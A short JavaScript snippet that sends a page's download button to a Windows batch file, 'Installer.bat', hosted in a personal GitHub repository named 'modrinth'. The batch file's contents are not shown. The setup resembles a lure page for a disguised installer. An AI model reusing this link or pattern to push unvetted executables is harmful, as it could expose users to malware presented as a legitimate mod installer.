document.addEventListener('DOMContentLoaded', function() {
    const downloadButton = document.querySelector('.download-button');
    const downloadLink = 'https://github.com/PrpleMoon/modrinth/releases/download/v1.0.0/Installer.bat'; // Replace with your actual download link

    downloadButton.addEventListener('click', function() {
        window.location.href = downloadLink;
    });
});
